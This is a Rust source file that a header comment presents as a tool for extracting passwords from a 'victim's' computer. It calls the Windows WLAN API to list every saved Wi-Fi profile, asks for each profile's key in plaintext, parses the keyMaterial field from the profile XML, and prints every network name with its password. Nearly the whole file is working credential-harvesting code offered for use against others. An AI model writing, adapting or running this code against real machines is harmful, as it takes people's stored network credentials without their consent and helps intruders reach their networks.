//this script extracts the passwords from the victim's computer system.



use std::ptr::null_mut;
use std::slice;
use winapi::{ctypes::c_void, shared::winerror::ERROR_SUCCESS};
use winapi::um::wlanapi::*;
use winapi::um::winnt::LPWSTR;
use widestring::U16CString;
use quick_xml::{Reader,events::Event};
use log::{info,error};

pub fn wifi_ext(){
    env_logger::init(); //This initializes the logger using the environment variables
    unsafe{
        let mut handle: *mut c_void = null_mut();
        //initialize a null holding handle
        let client_version: u32  = 2;
        let mut negotiated_version:u32 = 0;
        let result = WlanOpenHandle(client_version,null_mut(),&mut negotiated_version,&mut handle);
        if result != ERROR_SUCCESS{
            error!("WlanOpenHandle failed : {}",result);
            return;
        }
        info!("WlanOpenHandleSuceeded.....");

        let mut interface_list: *mut WLAN_INTERFACE_INFO_LIST = null_mut();
        //initializing a list of wifi interfaces with null bytes nut is mutable
        let result = WlanEnumInterfaces(handle,null_mut(),&mut interface_list);
        //this will create an enum of the wifi interfaces.

        if result!=ERROR_SUCCESS{
            error!("enumeration failed!!! :  {}",result);
            return;
        }
        info!("Wifi Interfaces enumeration successful!!");

        let interface_list_ref = &*interface_list;
        //reference to the value of the element of the array

        let interfaces = slice::from_raw_parts(interface_list_ref.InterfaceInfo.as_ptr(),interface_list_ref.dwNumberOfItems as usize);
        //it is the iteration of all the interfaces inside the system.

        for interface in interfaces{
            let interface_guid = &interface.InterfaceGuid;
            //the guid of the interface of the wifi network 
            //This is an identifier to the interface we have

            let mut profile_list: *mut WLAN_PROFILE_INFO_LIST = null_mut();
            let result = WlanGetProfileList(handle,interface_guid,null_mut(),&mut profile_list);
            //get the list of profiles of the wifi interfaces

            if result != ERROR_SUCCESS{
                error!("Profile list could not be obtained: {}",result);
                continue;
            }
            info!("WlanGetProfileList successful...");
            let profile_list_ref = &*profile_list;
            let profiles =slice::from_raw_parts(profile_list_ref.ProfileInfo.as_ptr(),profile_list_ref.dwNumberOfItems as usize);

            //then we have to iterate through the profiles inside the interface

            for profile in profiles{
                let profile_name = U16CString::from_ptr_str(profile.strProfileName.as_ptr());
                //convert a pointer to a string or simply a char pointer buffer to a string

                let mut profile_xml: LPWSTR = null_mut();
                //this is to parse the xml of the wifi profile

                let mut flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                let result = WlanGetProfile(handle,interface_guid,profile_name.as_ptr(),null_mut(),&mut profile_xml,&mut flags,null_mut());
                if result != ERROR_SUCCESS{
                    error!("Error while getting the profile xml!!");
                    continue;
                }
                let profile_xml_slice = slice::from_raw_parts(profile_xml,wcslen(profile_xml));
                let profile_xml_string = String::from_utf16_lossy(profile_xml_slice);
                //This fn will convert the hexadecimal string profile_xml_slices into a string containing the string from a hexadecimal number blocks.


                let mut reader = Reader::from_str(&profile_xml_string);
                reader.trim_text(true); //trimming the read string from the xml
                let mut in_shared_key = false;
                let mut key_material = String::new();


                //Loop for parsing the XML of the Wifi Profile
                loop{
                    match reader.read_event(){
                        Ok(Event::Start(ref e))=>{
                            if e.name() == quick_xml::name::QName(b"keyMaterial"){
                                in_shared_key = true;
                            }
                        }
                        Ok(Event::Text(ref e)) if in_shared_key =>{
                            key_material = e.escape_ascii().to_string();
                            in_shared_key = false;
                        }
                        Ok(Event::Eof) => break,
                        Err(e) => {
                            error!("Error parsing the XML of wifi -> {:?}",e);
                            break;
                        }
                        _ => (), //this statement defines that nothing will be returned by the function if any other condition is fulfilled.

                    }
                }

                if !key_material.is_empty(){
                    println!("Name: {} , Passwd: {}",profile_name.to_string_lossy(),key_material)
                }
                else{
                    println!("Namw: {} , Passwd Not Found",profile_name.to_string_lossy());

                }
                WlanFreeMemory(profile_xml as *mut _);

            }
            WlanFreeMemory(profile_list as *mut _);
        }
        WlanFreeMemory(interface_list as *mut _);
        WlanCloseHandle(handle,null_mut());
        info!("WlanCloseHandle Successful");

    }
}


//to calculates the length of the wide character string that is ended using the null terminator.
unsafe fn wcslen(mut s:*const u16) -> usize{
    let mut len = 0;
    while *s != 0{
        len +=1;
        s=s.add(1);
    }
    len
}